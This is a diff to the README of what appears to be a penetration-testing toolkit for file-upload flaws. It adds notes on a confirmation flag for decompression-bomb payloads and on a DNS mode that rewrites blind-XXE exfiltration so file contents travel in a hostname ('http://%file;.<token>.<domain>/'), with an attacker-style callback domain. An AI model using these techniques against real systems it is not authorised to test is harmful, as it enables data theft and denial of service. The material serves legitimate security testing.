@@ -120,7 +120,8 @@ upload-arsenal-upload -m suite -r request.txt \
 
 If the request has several file parts, pick one with `--field <name>`; for raw
 PUT/body uploads use `--raw-body`. `--scheme http|https` forces the scheme when
-the captured request omits it (proxy copies usually do).
+the captured request omits it (proxy copies usually do). Sending `destructive`
+payloads (decompression bombs) requires `-y`, mirroring the generator's gate.
 
 ### 2. Callback verifier — `upload-arsenal-callback`
 
@@ -146,6 +147,13 @@ upload-arsenal-callback -m suite --ngrok --arm
 > callback (a resolver looking up `token.attacker.tld`) does **not** traverse
 > an ngrok HTTP tunnel; it needs a real public IP plus an NS-delegated domain.
 > `--dns` is therefore refused in ngrok mode instead of silently doing nothing.
+
+`--arm` is idempotent — re-arming replaces the previous host/token rather than
+nesting another one, so you can re-point a suite at a new listener safely.
+With `--dns-domain`, blind-XXE exfil is rewritten so the read file travels in
+the **hostname** (`http://%file;.<token>.<domain>/`), which is what makes the
+resolver lookup itself carry the data; the DNS listener needs root for port 53
+(or use `--dns-port 5353` behind a firewall redirect).
 
 ### 3. Stored-file hunter — `upload-arsenal-hunt`
 
